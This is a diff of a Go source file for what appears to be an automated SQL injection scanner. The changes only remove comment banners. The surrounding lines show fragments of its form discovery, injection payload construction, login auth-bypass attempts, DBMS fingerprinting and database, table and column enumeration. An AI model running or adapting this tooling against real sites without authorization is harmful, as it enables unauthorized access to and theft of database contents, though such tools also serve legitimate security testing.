@@ -63,9 +63,6 @@ var placeholderRE = regexp.MustCompile(
 		`|\[[a-zA-Z_][a-zA-Z0-9_]*\]` +
 		`|<[a-zA-Z_][a-zA-Z0-9_]*>`)
 
-// =============================================================================
-// HTML parsing
-// =============================================================================
 var (
 	formBlockRE   = regexp.MustCompile(`(?is)<form\b([^>]*)>(.*?)</form>`)
 	formActionRE  = regexp.MustCompile(`(?i)action\s*=\s*["']([^"']*)["']`)
@@ -303,9 +300,6 @@ func discoverInjectionPoints(ctx context.Context, rawURL, cookie string, cfg Con
 	return uniq, nil
 }
 
-// =============================================================================
-// Tamper
-// =============================================================================
 type Tamper interface {
 	Apply(string) string
 	Name() string
@@ -389,9 +383,6 @@ var tamperRegistry = map[string]Tamper{
 	"urlencode":     urlencode{},
 }
 
-// =============================================================================
-// Profiles
-// =============================================================================
 type Profile struct {
 	Name, Sleep, Substr, Ascii, Length, Comment string
 	FromSchema, FromTables, FromColumns         string
@@ -439,9 +430,6 @@ var dbmsErrorSignatures = map[string][]string{
 	"sqlite":     {"sqlite", "sql logic error", "unrecognized token:", "no such table:", "no such column:", "no such function:", `near "`, "datatype mismatch"},
 }
 
-// =============================================================================
-// Result
-// =============================================================================
 type Result struct {
 	Target    TargetInfo            `json:"target"`
 	Detect    DetectInfo            `json:"detection"`
@@ -484,9 +472,6 @@ type Stats struct {
 	Errors   int64 `json:"errors"`
 }
 
-// =============================================================================
-// Scope / Session
-// =============================================================================
 type Scope struct {
 	Allow []string
 	Deny  []string
@@ -552,9 +537,6 @@ func saveSession(path string, r *Result) error {
 	return os.WriteFile(path, data, 0644)
 }
 
-// =============================================================================
-// Config
-// =============================================================================
 type Config struct {
 	ProxyURL        string            `json:"proxy,omitempty"`
 	Insecure        bool              `json:"insecure,omitempty"`
@@ -586,9 +568,6 @@ type Config struct {
 	ScopeDeny       []string          `json:"scope_deny,omitempty"`
 }
 
-// =============================================================================
-// Injector
-// =============================================================================
 type Injector struct {
 	ctx    context.Context
 	cancel context.CancelFunc
@@ -862,9 +841,6 @@ func (i *Injector) hasTransportTamper() bool {
 	return false
 }
 
-// =============================================================================
-// send
-// =============================================================================
 func isRateLimitResponse(code int, body []byte) bool {
 	if code == 429 || code == 503 {
 		return true
@@ -1083,14 +1059,10 @@ func (i *Injector) sendSQL(payload string) ([]byte, time.Duration, error) {
 	return i.send(i.transform(payload))
 }
 
-// =============================================================================
-// Context + detection
-// =============================================================================
 func (i *Injector) condPayload(cond string) string {
 	return i.value + i.injPrefix + " AND " + cond + i.injSuffix
 }
 
-// DetectContextAndBoolean — 5 farklı SQL context dener, diff üreteni seçer.
 func (i *Injector) DetectContextAndBoolean() bool {
 	candidates := []struct{ name, prefix, suffix string }{
 		{"int", "", "-- -"},
@@ -1128,7 +1100,6 @@ func (i *Injector) DetectContextAndBoolean() bool {
 	return false
 }
 
-// DetectAuthBypass — login formlarında ham payload'larla deneme.
 func (i *Injector) DetectAuthBypass() bool {
 	baseBody, _, err := i.send(i.value)
 	if err != nil {
@@ -1331,9 +1302,6 @@ func (i *Injector) FingerprintByError() string {
 	return ""
 }
 
-// =============================================================================
-// isTrue / evalCond / extraction
-// =============================================================================
 func (i *Injector) isTrue(payload string) bool {
 	body, _, err := i.sendSQL(payload)
 	if err != nil {
@@ -1474,9 +1442,6 @@ func (i *Injector) extractValue(query string, maxLen int) (string, error) {
 	return i.extract(query, maxLen)
 }
 
-// =============================================================================
-// Fingerprint / Enum
-// =============================================================================
 func (i *Injector) Fingerprint() error {
 	probes := []struct{ dbms, query string }{
 		{"mysql", "SELECT @@version"},
@@ -1519,7 +1484,6 @@ func (i *Injector) EnumDatabases(limit int) []string {
 	i.logf("\n[*] Veritabanları...\n")
 	var dbs []string
 	if i.profile.Name == "sqlite" {
-		// SQLite'ta "databases" = tablo listesi. EnumTables ile dön.
 		tabs := i.EnumTables("", limit)
 		return tabs
 	}
@@ -1634,7 +1598,6 @@ func crudeSQLiteColumn(sqlText string, n int) string {
 		return ""
 	}
 	p := strings.TrimSpace(parts[n])
-	// Skip constraints (PRIMARY KEY, FOREIGN KEY, UNIQUE, CHECK, CONSTRAINT)
 	upper := strings.ToUpper(p)
 	for _, kw := range []string{"PRIMARY KEY", "FOREIGN KEY", "UNIQUE", "CHECK", "CONSTRAINT"} {
 		if strings.HasPrefix(upper, kw) {
@@ -1726,9 +1689,6 @@ enqueue:
 	i.saveIfSession()
 }
 
-// =============================================================================
-// Output
-// =============================================================================
 func (r *Result) finalize() {
 	r.EndedAt = time.Now()
 	r.Duration = r.EndedAt.Sub(r.StartedAt).Round(time.Millisecond).String()
@@ -1866,9 +1826,6 @@ func formatMarkdown(r *Result) string {
 	return b.String()
 }
 
-// =============================================================================
-// Yardımcılar
-// =============================================================================
 func cloneValues(v url.Values) url.Values {
 	out := url.Values{}
 	for k, vv := range v {
@@ -2026,9 +1983,6 @@ func splitTrim(s, sep string) []string {
 	return out
 }
 
-// =============================================================================
-// CLI
-// =============================================================================
 type multiFlag []string
 
 func (m *multiFlag) String() string { return strings.Join(*m, ",") }
@@ -2419,9 +2373,6 @@ func main() {
 	}
 }
 
-// =============================================================================
-// prepare / run
-// =============================================================================
 func (i *Injector) prepare() bool {
 	if i.cfg.TotalTimeout > 0 {
 		c, cancel := context.WithTimeout(i.ctx, i.cfg.TotalTimeout)
@@ -2434,7 +2385,6 @@ func (i *Injector) prepare() bool {
 	}
 	i.profile = profiles["mysql"]
 
-	// POST formlarında auth-bypass dene
 	authBypass := false
 	if i.method == "POST" {
 		authBypass = i.DetectAuthBypass()
@@ -2525,7 +2475,6 @@ func runScan(inj *Injector) bool {
 	}
 	inj.profile = profiles["mysql"]
 
-	// Auth bypass
 	authOK := false
 	if inj.method == "POST" {
 		authOK = inj.DetectAuthBypass()
